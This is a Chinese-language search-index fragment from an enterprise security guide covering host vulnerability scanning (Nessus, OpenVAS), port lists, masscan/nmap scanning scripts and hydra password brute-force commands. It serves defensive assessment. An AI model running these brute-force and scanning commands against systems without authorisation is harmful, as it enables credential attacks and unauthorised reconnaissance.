\u9488\u5bf9\u4e3b\u673a\u5b89\u5168\u626b\u63cf\u4e3b\u8981\u5305\u62ec\uff1a\u7aef\u53e3\u5f00\u653e\u626b\u63cf\u4e0e\u8bbf\u95ee\u63a7\u5236\u626b\u63cf\u3001\u6f0f\u6d1e\u626b\u63cf\u4e0e\u5f31\u53e3\u4ee4\u626b\u63cf\u3002 \u9488\u5bf9\u4f01\u4e1a\u5185\u90e8\u5b89\u5168\u626b\u63cf\u5e94\u8be5\u5206\u4e3a\u4e24\u79cd\u7c7b\u578b\uff1a\u5185\u90e8\u626b\u63cf\u4e0e\u5916\u90e8\u626b\u63cf\uff0c\u8fd9\u91cc\u7684\u5185\u5316\u5212\u5206\u5e94\u8be5\u662f\u7f51\u7edc\u5206\u754c\u7684\u5212\u5206\uff1b\u5185\u90e8\u626b\u63cf\u4e3b\u8981\u7528\u4e8e\u53d1\u73b0\u5185\u90e8\u7684\u5b89\u5168\u9690\u60a3\uff0c\u5916\u90e8\u626b\u63cf\u4e3b\u8981\u662f\u7ad9\u5728\u653b\u51fb\u8005\u7684\u89d2\u5ea6\u53d1\u73b0\u5b89\u5168\u9690\u60a3\u3002 \u6f0f\u6d1e\u626b\u63cf\u5de5\u5177 Nessus Nessus\u4e0b\u8f7d\u5730\u5740 Nessus\u6ce8\u518c\u5730\u5740 Centos7 \u5b89\u88c5nessus # \u4e0b\u8f7drpm\u5305\u8fdb\u884c\u5b89\u88c5 #\u542f\u52a8\u670d\u52a1 systemctl start nessusd.service # \u6fc0\u6d3b /opt/nessus/sbin/nessuscli fetch --register ****-****-****-****-**** # \u6ce8\u518c\u7528\u6237 /opt/nessus/sbin/nessuscli adduser # \u8bbf\u95ee\uff1ahttps://localhost:8834 \u5982\u679c\u7f51\u7edc\u5f88\u5dee\uff0c\u4e5f\u53ef\u4ee5\u8fdb\u884c\u79bb\u7ebf\u66f4\u65b0\u5b89\u88c5\u5305\uff1a \u5b98\u65b9\u6587\u6863 # \u751f\u6210licenses # https://plugins.nessus.org/v2/offline.php /opt/nessus/sbin/nessuscli fetch --challenge # \u590d\u5236\u751f\u6210\u7684code\u4e0e\u6ce8\u518c\u7801\uff0c\u8fdb\u884c\u751f\u6210\u4f1a\u751f\u6210\u4e0b\u8f7d\u5730\u5740\u548clicenses\u6587\u4ef6\uff0c\u8fdb\u884c\u6ce8\u518c /opt/nessus/sbin/nessuscli fetch --register-offline nessus.license # \u91cd\u542fnessus systemctl restart nessusd.service # \u8bbf\u95ee\uff0c\u4f7f\u7528\u8d26\u53f7\u5bc6\u7801\u767b\u5f55 # \u66f4\u65b0\u63d2\u4ef6 /opt/nessus/sbin/nessuscli update all-2.0.tar.gz OpenVAS \u5b98\u7f51\u5730\u5740 \u4e0d\u63a8\u8350\u4f7f\u7528\u3002 \u5f31\u53e3\u4ee4\u626b\u63cf \u5f31\u53e3\u4ee4\u626b\u63cf\u4e5f\u662f\u6f0f\u6d1e\u626b\u63cf\u7684\u4e00\u79cd\uff0c\u53ea\u4e0d\u8fc7\u5f31\u53e3\u4ee4\u626b\u63cf\u7b97\u662f\u6bd4\u8f83\u7279\u6b8a\u7684\u4e00\u7c7b\u6f0f\u6d1e\u3002 \u5f31\u53e3\u4ee4\u626b\u63cf\u5de5\u5177 hydra centos7 \u5b89\u88c5 hydra\uff1a Linux\u7248\u672c yum install epel-release -y yum install hydra.x86_64 -y windows \u5b89\u88c5 hydra\uff1a hydra Windows\u7248\u672c hydra \u5e38\u7528\u547d\u4ee4 hydra -l user -P passlist.txt ftp://192.168.0.1 hydra -L user.txt -P pass.txt protocol://ip medusa \u4e0ehydra\u7c7b\u4f3c\u7684\u5de5\u5177\uff0c\u4f7f\u7528\u65b9\u5f0f\u4e5f\u7c7b\u4f3c\u3002 x-scan bruter \u4e0b\u8f7d\u5730\u5740 \u53c2\u8003\u8d44\u6599","title":"\u4e3b\u673a\u5b89\u5168\u626b\u63cf"},{"location":"infrastructure-security/host-security/host-security-scan/#_1","text":"\u9488\u5bf9\u4e3b\u673a\u5b89\u5168\u626b\u63cf\u4e3b\u8981\u5305\u62ec\uff1a\u7aef\u53e3\u5f00\u653e\u626b\u63cf\u4e0e\u8bbf\u95ee\u63a7\u5236\u626b\u63cf\u3001\u6f0f\u6d1e\u626b\u63cf\u4e0e\u5f31\u53e3\u4ee4\u626b\u63cf\u3002 \u9488\u5bf9\u4f01\u4e1a\u5185\u90e8\u5b89\u5168\u626b\u63cf\u5e94\u8be5\u5206\u4e3a\u4e24\u79cd\u7c7b\u578b\uff1a\u5185\u90e8\u626b\u63cf\u4e0e\u5916\u90e8\u626b\u63cf\uff0c\u8fd9\u91cc\u7684\u5185\u5316\u5212\u5206\u5e94\u8be5\u662f\u7f51\u7edc\u5206\u754c\u7684\u5212\u5206\uff1b\u5185\u90e8\u626b\u63cf\u4e3b\u8981\u7528\u4e8e\u53d1\u73b0\u5185\u90e8\u7684\u5b89\u5168\u9690\u60a3\uff0c\u5916\u90e8\u626b\u63cf\u4e3b\u8981\u662f\u7ad9\u5728\u653b\u51fb\u8005\u7684\u89d2\u5ea6\u53d1\u73b0\u5b89\u5168\u9690\u60a3\u3002","title":"\u4e3b\u673a\u5b89\u5168\u626b\u63cf"},{"location":"infrastructure-security/host-security/host-security-scan/#_2","text":"Nessus Nessus\u4e0b\u8f7d\u5730\u5740 Nessus\u6ce8\u518c\u5730\u5740 Centos7 \u5b89\u88c5nessus # \u4e0b\u8f7drpm\u5305\u8fdb\u884c\u5b89\u88c5 #\u542f\u52a8\u670d\u52a1 systemctl start nessusd.service # \u6fc0\u6d3b /opt/nessus/sbin/nessuscli fetch --register ****-****-****-****-**** # \u6ce8\u518c\u7528\u6237 /opt/nessus/sbin/nessuscli adduser # \u8bbf\u95ee\uff1ahttps://localhost:8834 \u5982\u679c\u7f51\u7edc\u5f88\u5dee\uff0c\u4e5f\u53ef\u4ee5\u8fdb\u884c\u79bb\u7ebf\u66f4\u65b0\u5b89\u88c5\u5305\uff1a \u5b98\u65b9\u6587\u6863 # \u751f\u6210licenses # https://plugins.nessus.org/v2/offline.php /opt/nessus/sbin/nessuscli fetch --challenge # \u590d\u5236\u751f\u6210\u7684code\u4e0e\u6ce8\u518c\u7801\uff0c\u8fdb\u884c\u751f\u6210\u4f1a\u751f\u6210\u4e0b\u8f7d\u5730\u5740\u548clicenses\u6587\u4ef6\uff0c\u8fdb\u884c\u6ce8\u518c /opt/nessus/sbin/nessuscli fetch --register-offline nessus.license # \u91cd\u542fnessus systemctl restart nessusd.service # \u8bbf\u95ee\uff0c\u4f7f\u7528\u8d26\u53f7\u5bc6\u7801\u767b\u5f55 # \u66f4\u65b0\u63d2\u4ef6 /opt/nessus/sbin/nessuscli update all-2.0.tar.gz OpenVAS \u5b98\u7f51\u5730\u5740 \u4e0d\u63a8\u8350\u4f7f\u7528\u3002","title":"\u6f0f\u6d1e\u626b\u63cf\u5de5\u5177"},{"location":"infrastructure-security/host-security/host-security-scan/#_3","text":"\u5f31\u53e3\u4ee4\u626b\u63cf\u4e5f\u662f\u6f0f\u6d1e\u626b\u63cf\u7684\u4e00\u79cd\uff0c\u53ea\u4e0d\u8fc7\u5f31\u53e3\u4ee4\u626b\u63cf\u7b97\u662f\u6bd4\u8f83\u7279\u6b8a\u7684\u4e00\u7c7b\u6f0f\u6d1e\u3002","title":"\u5f31\u53e3\u4ee4\u626b\u63cf"},{"location":"infrastructure-security/host-security/host-security-scan/#_4","text":"hydra centos7 \u5b89\u88c5 hydra\uff1a Linux\u7248\u672c yum install epel-release -y yum install hydra.x86_64 -y windows \u5b89\u88c5 hydra\uff1a hydra Windows\u7248\u672c hydra \u5e38\u7528\u547d\u4ee4 hydra -l user -P passlist.txt ftp://192.168.0.1 hydra -L user.txt -P pass.txt protocol://ip medusa \u4e0ehydra\u7c7b\u4f3c\u7684\u5de5\u5177\uff0c\u4f7f\u7528\u65b9\u5f0f\u4e5f\u7c7b\u4f3c\u3002 x-scan bruter \u4e0b\u8f7d\u5730\u5740","title":"\u5f31\u53e3\u4ee4\u626b\u63cf\u5de5\u5177"},{"location":"infrastructure-security/host-security/host-security-scan/#_5","text":"","title":"\u53c2\u8003\u8d44\u6599"},{"location":"infrastructure-security/host-security/host-security-scan/open-source-scanner/","text":"\u5f00\u6e90\u626b\u63cf\u5668 \u5de1\u98ce github\u5730\u5740 \u4f0f\u7fb2 github\u5730\u5740","title":"\u5f00\u6e90\u626b\u63cf\u5668"},{"location":"infrastructure-security/host-security/host-security-scan/open-source-scanner/#_1","text":"","title":"\u5f00\u6e90\u626b\u63cf\u5668"},{"location":"infrastructure-security/host-security/host-security-scan/open-source-scanner/#_2","text":"github\u5730\u5740","title":"\u5de1\u98ce"},{"location":"infrastructure-security/host-security/host-security-scan/open-source-scanner/#_3","text":"github\u5730\u5740","title":"\u4f0f\u7fb2"},{"location":"infrastructure-security/host-security/host-security-scan/port/","text":"\u7aef\u53e3\u5b89\u5168 \u4e00\u7bc7\u8001\u6587\u7ae0\uff0c\u56de\u7089\u6539\u9020\u4e00\u4e0b\uff1a \u7aef\u53e3\u6e17\u900f\u603b\u7ed3 \u7aef\u53e3\u4ecb\u7ecd \u7aef\u53e3 \u670d\u52a1 20 ftp\u6570\u636e\u7aef\u53e3 21 ftp\u63a7\u5236\u7aef\u53e3 22 ssh 23 telnet 25 smtp 53 dns 67-68 dhcp 69 tftp\u5c0f\u578b\u6587\u4ef6\u4f20\u8f93 80-89 Web 109-110 pop2\u3001pop3 137 NetBIOS Name Service NetBIOS\u540d\u79f0\u670d\u52a1 139 NetBIOS Session Service \u63d0\u4f9bSamba 143 imap 161 snmp 210 Oracle XDB FTP 389 ldap 443 Web 465 smtps 512-514 Linux R 546 dhcp failover\u53cc\u673a\u70ed\u5907 873 rsync 993 imaps 995 pop3s 1080 \u4ee3\u7406 1090-1099 JBoss 1158 Oracle EMCTL 1352 Lotus 1433-1434 MSSQL 1521 Oracle 2049 nfs 2181 zookeeper 2222 ssh 2888 zookeeper\u96c6\u7fa4\u5185\u901a\u8baf 3306-3308 MySQL 3389 rdp Windows\u8fdc\u7a0b\u8fde\u63a5 3700 GlassFish IIOP 3888 zookeeper\u9009\u4e3eLeader 4040 4100 SysBase\u76d1\u542c\u7aef\u53e3 4200 SysBase\u5907\u4efd\u7aef\u53e3 4444-4445 4848 GlassFish\u63a7\u5236\u53f0 5000 SysBase\u3001DB2 5006 5432 PostgreSQL 5601 Kibana 5632 PyAnyWhere 5900-5905 VNC (\u6700\u540e\u4e00\u4f4d\u4ee3\u8868\u684c\u9762ID) 6379 Redis 7001 WebLogic\u63a7\u5236\u53f0 7077 7180-7182 8000-8099 Axis2\u3001Tomcat\u3001JBoss\u3001GlassFish\u3001Jenkins\u3001Resin\u3001Jetty\u3001zabbix 8019 ZKFC 8020 \u9ad8\u53ef\u7528\u7684HDFS RPC 8088 Yarn Web UI 8480 8485 JournalNode\u7684RPC 8888 Web 9000 \u975e\u9ad8\u53ef\u7528\u7684HDFS RPC 9080-9090 WebSphere\u63a7\u5236\u53f0\u4e0e\u5e94\u7528 9083 Hive metastore\u9ed8\u8ba4\u76d1\u542c 9092 Kafka\u96c6\u7fa4\u8282\u70b9\u95f4\u901a\u4fe1 9200 elasticsearch 9300 elasticsearch 9418 10000 10020 11211 memcache 18080 19888 27017 MongoDB 50070 HDFS Web UI 50010-50090 Hadoop 60010 HBase master\u7684Web UI 60030 HBase regionServer\u7684Web UI \u7aef\u53e3\u626b\u63cf \u5e38\u89c1\u7684\u7aef\u53e3\u626b\u63cf\u5217\u8868\uff1a 20-25,53,67-69,80-89,109-110,137-139,143,161,210,389,443,465,512-514,546,873,993-995,1080,1090-1099,1158,1352,1433-1434,1521,2049,2181,2222,2888,3306-3308,3389,3690,3700,3888,4040,4100,4200,4444-4445,4848,5000,5006,5432,5601,5632,5900-5905,6379,7001,7077,7180-7182,8000-8099,8480,8485,8888,9000,9080-9090,9092,9200,9300,9418,10000,10020,11211,18080,19888,27017-27019,50010-50090,50470,50475,60000,60010,60020,60030 \u7aef\u53e3\u626b\u63cf\u601d\u8def \u4e3b\u673a\u5b58\u6d3b\u6027\u626b\u63cf\uff1a\u5229\u7528nmap\u8fdb\u884c\u4e3b\u673a\u5b58\u6d3b\u6027\u63a2\u6d4b\uff1b \u5b58\u6d3b\u6027\u4e3b\u673a\u7aef\u53e3\u5f00\u653e\u626b\u63cf\uff1a\u5229\u7528masscan\u5bf9\u4e0a\u4e00\u6b65\u5224\u65ad\u5b58\u6d3b\u7684\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u5f00\u653e\u6027\u626b\u63cf\uff1b \u5229\u7528\u7f51\u7edc\u670d\u52a1\u63a2\u6d4b\u7aef\u53e3\uff1a\u5229\u7528\u5982\uff1ashodan\u7b49\u7f51\u7edc\u670d\u52a1\u63a2\u6d4b\u4e3b\u673a\u7aef\u53e3\uff1b \u7aef\u53e3\u670d\u52a1\u626b\u63cf\uff1a\u5229\u7528nmap\u5bf9\u5f00\u653e\u7684\u7aef\u53e3\u8fdb\u884c\u670d\u52a1\u63a2\u6d4b\uff1b \u626b\u63cf\u7ed3\u679c\u5165\u5e93\uff1a\u5bf9\u626b\u63cf\u540e\u7684\u7ed3\u679c\u63d0\u53d6\u6211\u4eec\u9700\u8981\u7684\u5b57\u6bb5\u5b58\u5165\u6570\u636e\u5e93\u4e2d\u8fdb\u884c\u5c55\u793a\uff1b \u5176\u5b83\u65b9\u5f0f \u4e3b\u673a\u5165\u4fb5\u68c0\u6d4b\u83b7\u53d6\u7aef\u53e3\u5f00\u653e\u4fe1\u606f\uff1a\u6b64\u4fe1\u606f\u4e0d\u7cbe\u81f4\uff0c\u56e0\u4e3a\u9488\u5bf9\u5916\u90e8\u653b\u51fb\u8005\u4e3b\u673a\u5f00\u653e\u7684\u7aef\u53e3\u5e76\u4e0d\u4e00\u5b9a\u5168\u90e8\u5bf9\u5916\u5f00\u653e\uff1b masscan github\u5730\u5740 ubuntu/debian \u5b89\u88c5 masscan sudo apt-get install git gcc make libpcap-dev git clone https://github.com/robertdavidgraham/masscan cd masscan make centos7 \u5b89\u88c5 masscan # \u4e0b\u8f7d\u5730\u5740\uff1ahttps://pkgs.org/download/masscan # \u5229\u7528\u4e0b\u8f7d\u7684RPM\u5305\u76f4\u63a5\u8fdb\u884c\u5b89\u88c5 wget http://dl.fedoraproject.org/pub/epel/7/x86_64/Packages/m/masscan-1.0.3-5.el7.x86_64.rpm yum install libpcap-devel.x86_64 -y rpm -ivh masscan-1.0.3-5.el7.x86_64.rpm # yum\u8fdb\u884c\u5b89\u88c5 vim /etc/yum.repos.d/nux-misc.repo [nux-misc] name=Nux Misc baseurl=http://li.nux.ro/download/nux/misc/el7/x86_64/ enabled=0 gpgcheck=1 gpgkey=http://li.nux.ro/download/nux/RPM-GPG-KEY-nux.ro # \u5b89\u88c5 yum --enablerepo=nux-misc install masscan mac\u5b89\u88c5masscan \u5b98\u7f51\u5730\u5740 ruby -e $(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install) /dev/null 2 /dev/null brew install masscan masscan\u626b\u63cf def port_masscan(): command = masscan -p20-25,53,67-69,80-89,109-111,137-139,143,161,210,389,443,465,512-514,546,873,993-995, \\ 1080,1090-1099,1158,1352,1433-1434,1521,2049,2181,2222,2888,3306-3308,3389,3690,3700,3888,4040,4100,4200, \\ 4444-4445,4848,5000,5006,5432,5601,5632,5900-5905,6379,7001,7077,7180-7182,8000-8099,8480,8485,8888,9000, \\ 9080-9090,9092,9200,9300,9418,10000,10020,11211,18080,19888,27017-27019,50010-50090,50470,50475,60000,60010,60020,60030 \\ --rate=50 -iL tmp/ip_tmp.txt -oX tmp/output.xml os.popen(command) nmap centos7\u5b89\u88c5nmap yum install nmap.x86_64 -y nmap\u5e38\u7528\u547d\u4ee4 nmap -sS -sV -p1-65535 --max-scan-delay 10 --max-retries 2 -T4 --min-rate 300 --open nmap\u626b\u63cf import nmap nm = nmap.PortScanner() def port_scan(ip,port): try: nm.scan(ip,str(port),arguments='-sV -Pn -T4 --max-rate 1000 --max-retries 1 --max-rtt-timeout 100ms --open') service = nm[ip]['tcp'][int(port)]['product'] version = nm[ip]['tcp'][int(port)]['version'] print ip,port,service,version except Exception as e: print e zmap \u4e0d\u63a8\u8350\u4f7f\u7528 github\u5730\u5740 centos7\u5b89\u88c5zmap yum install zmap.x86_64 -y \u7aef\u53e3\u5e38\u89c1\u653b\u51fb\u65b9\u5f0f \u66b4\u529b\u7834\u89e3\u6cd5 hydra\u6ee1\u8db3\u5e38\u89c1\u7684\u670d\u52a1\u66b4\u529b\u7834\u89e3\uff0c\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\u73b0\u5728\u5f88\u591a\u670d\u52a1\u90fd\u9ed8\u8ba4\u652f\u6301\u7206\u7834\u9632\u5fa1\u3002 \u7aef\u53e3\u6f0f\u6d1e\u6cd5 \u6301\u7eed\u66f4\u65b0 \u7aef\u53e3+\u670d\u52a1+\u7248\u672c \u6f0f\u6d1e\u8be6\u60c5 \u53c2\u8003\u8d44\u6599 \u5927\u6570\u636e\u7ec4\u4ef6\u5e38\u7528\u7aef\u53e3\u603b\u7ed3\uff08\u4e0d\u65ad\u66f4\u65b0\uff09 \u5927\u6570\u636e\u5e38\u89c1\u7aef\u53e3\u6c47\u603b-hadoop\u3001hbase\u3001hive\u3001spark\u3001kafka\u3001zookeeper\u7b49\uff08\u6301\u7eed\u66f4\u65b0\uff09","title":"\u7aef\u53e3\u5b89\u5168"},{"location":"infrastructure-security/host-security/host-security-scan/port/#_1","text":"\u4e00\u7bc7\u8001\u6587\u7ae0\uff0c\u56de\u7089\u6539\u9020\u4e00\u4e0b\uff1a \u7aef\u53e3\u6e17\u900f\u603b\u7ed3","title":"\u7aef\u53e3\u5b89\u5168"},{"location":"infrastructure-security/host-security/host-security-scan/port/#_2","text":"\u7aef\u53e3 \u670d\u52a1 20 ftp\u6570\u636e\u7aef\u53e3 21 ftp\u63a7\u5236\u7aef\u53e3 22 ssh 23 telnet 25 smtp 53 dns 67-68 dhcp 69 tftp\u5c0f\u578b\u6587\u4ef6\u4f20\u8f93 80-89 Web 109-110 pop2\u3001pop3 137 NetBIOS Name Service NetBIOS\u540d\u79f0\u670d\u52a1 139 NetBIOS Session Service \u63d0\u4f9bSamba 143 imap 161 snmp 210 Oracle XDB FTP 389 ldap 443 Web 465 smtps 512-514 Linux R 546 dhcp failover\u53cc\u673a\u70ed\u5907 873 rsync 993 imaps 995 pop3s 1080 \u4ee3\u7406 1090-1099 JBoss 1158 Oracle EMCTL 1352 Lotus 1433-1434 MSSQL 1521 Oracle 2049 nfs 2181 zookeeper 2222 ssh 2888 zookeeper\u96c6\u7fa4\u5185\u901a\u8baf 3306-3308 MySQL 3389 rdp Windows\u8fdc\u7a0b\u8fde\u63a5 3700 GlassFish IIOP 3888 zookeeper\u9009\u4e3eLeader 4040 4100 SysBase\u76d1\u542c\u7aef\u53e3 4200 SysBase\u5907\u4efd\u7aef\u53e3 4444-4445 4848 GlassFish\u63a7\u5236\u53f0 5000 SysBase\u3001DB2 5006 5432 PostgreSQL 5601 Kibana 5632 PyAnyWhere 5900-5905 VNC (\u6700\u540e\u4e00\u4f4d\u4ee3\u8868\u684c\u9762ID) 6379 Redis 7001 WebLogic\u63a7\u5236\u53f0 7077 7180-7182 8000-8099 Axis2\u3001Tomcat\u3001JBoss\u3001GlassFish\u3001Jenkins\u3001Resin\u3001Jetty\u3001zabbix 8019 ZKFC 8020 \u9ad8\u53ef\u7528\u7684HDFS RPC 8088 Yarn Web UI 8480 8485 JournalNode\u7684RPC 8888 Web 9000 \u975e\u9ad8\u53ef\u7528\u7684HDFS RPC 9080-9090 WebSphere\u63a7\u5236\u53f0\u4e0e\u5e94\u7528 9083 Hive metastore\u9ed8\u8ba4\u76d1\u542c 9092 Kafka\u96c6\u7fa4\u8282\u70b9\u95f4\u901a\u4fe1 9200 elasticsearch 9300 elasticsearch 9418 10000 10020 11211 memcache 18080 19888 27017 MongoDB 50070 HDFS Web UI 50010-50090 Hadoop 60010 HBase master\u7684Web UI 60030 HBase regionServer\u7684Web UI","title":"\u7aef\u53e3\u4ecb\u7ecd"},{"location":"infrastructure-security/host-security/host-security-scan/port/#_3","text":"\u5e38\u89c1\u7684\u7aef\u53e3\u626b\u63cf\u5217\u8868\uff1a 20-25,53,67-69,80-89,109-110,137-139,143,161,210,389,443,465,512-514,546,873,993-995,1080,1090-1099,1158,1352,1433-1434,1521,2049,2181,2222,2888,3306-3308,3389,3690,3700,3888,4040,4100,4200,4444-4445,4848,5000,5006,5432,5601,5632,5900-5905,6379,7001,7077,7180-7182,8000-8099,8480,8485,8888,9000,9080-9090,9092,9200,9300,9418,10000,10020,11211,18080,19888,27017-27019,50010-50090,50470,50475,60000,60010,60020,60030","title":"\u7aef\u53e3\u626b\u63cf"},{"location":"infrastructure-security/host-security/host-security-scan/port/#_4","text":"\u4e3b\u673a\u5b58\u6d3b\u6027\u626b\u63cf\uff1a\u5229\u7528nmap\u8fdb\u884c\u4e3b\u673a\u5b58\u6d3b\u6027\u63a2\u6d4b\uff1b \u5b58\u6d3b\u6027\u4e3b\u673a\u7aef\u53e3\u5f00\u653e\u626b\u63cf\uff1a\u5229\u7528masscan\u5bf9\u4e0a\u4e00\u6b65\u5224\u65ad\u5b58\u6d3b\u7684\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u5f00\u653e\u6027\u626b\u63cf\uff1b \u5229\u7528\u7f51\u7edc\u670d\u52a1\u63a2\u6d4b\u7aef\u53e3\uff1a\u5229\u7528\u5982\uff1ashodan\u7b49\u7f51\u7edc\u670d\u52a1\u63a2\u6d4b\u4e3b\u673a\u7aef\u53e3\uff1b \u7aef\u53e3\u670d\u52a1\u626b\u63cf\uff1a\u5229\u7528nmap\u5bf9\u5f00\u653e\u7684\u7aef\u53e3\u8fdb\u884c\u670d\u52a1\u63a2\u6d4b\uff1b \u626b\u63cf\u7ed3\u679c\u5165\u5e93\uff1a\u5bf9\u626b\u63cf\u540e\u7684\u7ed3\u679c\u63d0\u53d6\u6211\u4eec\u9700\u8981\u7684\u5b57\u6bb5\u5b58\u5165\u6570\u636e\u5e93\u4e2d\u8fdb\u884c\u5c55\u793a\uff1b \u5176\u5b83\u65b9\u5f0f \u4e3b\u673a\u5165\u4fb5\u68c0\u6d4b\u83b7\u53d6\u7aef\u53e3\u5f00\u653e\u4fe1\u606f\uff1a\u6b64\u4fe1\u606f\u4e0d\u7cbe\u81f4\uff0c\u56e0\u4e3a\u9488\u5bf9\u5916\u90e8\u653b\u51fb\u8005\u4e3b\u673a\u5f00\u653e\u7684\u7aef\u53e3\u5e76\u4e0d\u4e00\u5b9a\u5168\u90e8\u5bf9\u5916\u5f00\u653e\uff1b","title":"\u7aef\u53e3\u626b\u63cf\u601d\u8def"},{"location":"infrastructure-security/host-security/host-security-scan/port/#masscan","text":"github\u5730\u5740 ubuntu/debian \u5b89\u88c5 masscan sudo apt-get install git gcc make libpcap-dev git clone https://github.com/robertdavidgraham/masscan cd masscan make centos7 \u5b89\u88c5 masscan # \u4e0b\u8f7d\u5730\u5740\uff1ahttps://pkgs.org/download/masscan # \u5229\u7528\u4e0b\u8f7d\u7684RPM\u5305\u76f4\u63a5\u8fdb\u884c\u5b89\u88c5 wget http://dl.fedoraproject.org/pub/epel/7/x86_64/Packages/m/masscan-1.0.3-5.el7.x86_64.rpm yum install libpcap-devel.x86_64 -y rpm -ivh masscan-1.0.3-5.el7.x86_64.rpm # yum\u8fdb\u884c\u5b89\u88c5 vim /etc/yum.repos.d/nux-misc.repo [nux-misc] name=Nux Misc baseurl=http://li.nux.ro/download/nux/misc/el7/x86_64/ enabled=0 gpgcheck=1 gpgkey=http://li.nux.ro/download/nux/RPM-GPG-KEY-nux.ro # \u5b89\u88c5 yum --enablerepo=nux-misc install masscan mac\u5b89\u88c5masscan \u5b98\u7f51\u5730\u5740 ruby -e $(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install) /dev/null 2 /dev/null brew install masscan masscan\u626b\u63cf def port_masscan(): command = masscan -p20-25,53,67-69,80-89,109-111,137-139,143,161,210,389,443,465,512-514,546,873,993-995, \\ 1080,1090-1099,1158,1352,1433-1434,1521,2049,2181,2222,2888,3306-3308,3389,3690,3700,3888,4040,4100,4200, \\ 4444-4445,4848,5000,5006,5432,5601,5632,5900-5905,6379,7001,7077,7180-7182,8000-8099,8480,8485,8888,9000, \\ 9080-9090,9092,9200,9300,9418,10000,10020,11211,18080,19888,27017-27019,50010-50090,50470,50475,60000,60010,60020,60030 \\ --rate=50 -iL tmp/ip_tmp.txt -oX tmp/output.xml os.popen(command)","title":"masscan"},{"location":"infrastructure-security/host-security/host-security-scan/port/#nmap","text":"centos7\u5b89\u88c5nmap yum install nmap.x86_64 -y nmap\u5e38\u7528\u547d\u4ee4 nmap -sS -sV -p1-65535 --max-scan-delay 10 --max-retries 2 -T4 --min-rate 300 --open nmap\u626b\u63cf import nmap nm = nmap.PortScanner() def port_scan(ip,port): try: nm.scan(ip,str(port),arguments='-sV -Pn -T4 --max-rate 1000 --max-retries 1 --max-rtt-timeout 100ms --open') service = nm[ip]['tcp'][int(port)]['product'] version = nm[ip]['tcp'][int(port)]['version'] print ip,port,service,version except Exception as e: print e","title":"nmap"},{"location":"infrastructure-security/host-security/host-security-scan/port/#zmap","text":"\u4e0d\u63a8\u8350\u4f7f\u7528 github\u5730\u5740 centos7\u5b89\u88c5zmap yum install zmap.x86_64 -y","title":"zmap"},{"location":"infrastructure-security/host-security/host-security-scan/port/#_5","text":"","title":"\u7aef\u53e3\u5e38\u89c1\u653b\u51fb\u65b9\u5f0f"},{"location":"infrastructure-security/host-security/host-security-scan/port/#_6","text":"hydra\u6ee1\u8db3\u5e38\u89c1\u7684\u670d\u52a1\u66b4\u529b\u7834\u89e3\uff0c\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\u73b0\u5728\u5f88\u591a\u670d\u52a1\u90fd\u9ed8\u8ba4\u652f\u6301\u7206\u7834\u9632\u5fa1\u3002","title":"\u66b4\u529b\u7834\u89e3\u6cd5"},{"location":"infrastructure-security/host-security/host-security-scan/port/#_7","text":"\u6301\u7eed\u66f4\u65b0 \u7aef\u53e3+\u670d\u52a1+\u7248\u672c \u6f0f\u6d1e\u8be6\u60c5","title":"\u7aef\u53e3\u6f0f\u6d1e\u6cd5"},{"location":"infrastructure-security/host-security/host-security-scan/port/#_8","text":"\u5927\u6570\u636e\u7ec4\u4ef6\u5e38\u7528\u7aef\u53e3\u603b\u7ed3\uff08\u4e0d\u65ad\u66f4\u65b0\uff09 \u5927\u6570\u636e\u5e38\u89c1\u7aef\u53e3\u6c47\u603b-hadoop\u3001hbase\u3001hive\u3001spark\u3001kafka\u3001zookeeper\u7b49\uff08\u6301\u7eed\u66f4\u65b0\uff09","title":"\u53c2\u8003\u8d44\u6599"},{"location":"infrastructure-security/host-security/ids-ips/","text":"\u4e3b\u673a\u5165\u4fb5\u68c0\u6d4b \u9632\u5fa1\u7cfb\u7edf IDS IPS\u5206\u7c7b \u6839\u636e\u5e94\u7528\u573a\u666f\u5206\u7c7b \u7f51\u7edc\u578b\uff1aNIDS\u3001NIPS \u4e3b\u673a\u578b\uff1aHIDS\u3001HIPS \u5206\u5e03\u5f0f\uff1aDIDS\u3001DIPS \u6839\u636e\u68c0\u6d4b\u7b56\u7565\u5206\u7c7b \u6ee5\u7528\u68c0\u6d4b\uff1a \u5f02\u5e38\u68c0\u6d4b\uff1a \u5b8c\u6574\u6027\u5206\u6790\uff1a \u6839\u636e\u68c0\u6d4b\u7c7b\u578b\u5206\u7c7b \u57fa\u4e8e\u6587\u4ef6\uff1a \u57fa\u4e8e\u8fdb\u7a0b\uff1a \u57fa\u4e8e\u64cd\u4f5c \u5f00\u6e90\u4e3b\u673a\u5165\u4fb5\u68c0\u6d4b \u9632\u5fa1 yulong-hids \u5b98\u7f51\u5730\u5740 \u53c2\u8003\u8d44\u6599 \u9a6d\u9f99\u5f00\u6e90\u4e3b\u673a\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf","title":"\u4e3b\u673a\u5165\u4fb5\u68c0\u6d4b&\u9632\u5fa1\u7cfb\u7edf"},{"location":"infrastructure-security/host-security/ids-ips/#_1","text":"","title":"\u4e3b\u673a\u5165\u4fb5\u68c0\u6d4b&amp;\u9632\u5fa1\u7cfb\u7edf"},{"location":"infrastructure-security/host-security/ids-ips/#idsips","text":"","title":"IDS&amp;IPS\u5206\u7c7b"},{"location":"infrastructure-security/host-security/ids-ips/#_2","text":"\u7f51\u7edc\u578b\uff1aNIDS\u3001NIPS \u4e3b\u673a\u578b\uff1aHIDS\u3001HIPS \u5206\u5e03\u5f0f\uff1aDIDS\u3001DIPS","title":"\u6839\u636e\u5e94\u7528\u573a\u666f\u5206\u7c7b"},{"location":"infrastructure-security/host-security/ids-ips/#_3","text":"\u6ee5\u7528\u68c0\u6d4b\uff1a \u5f02\u5e38\u68c0\u6d4b\uff1a \u5b8c\u6574\u6027\u5206\u6790\uff1a","title":"\u6839\u636e\u68c0\u6d4b\u7b56\u7565\u5206\u7c7b"},{"location":"infrastructure-security/host-security/ids-ips/#_4","text":"\u57fa\u4e8e\u6587\u4ef6\uff1a \u57fa\u4e8e\u8fdb\u7a0b\uff1a 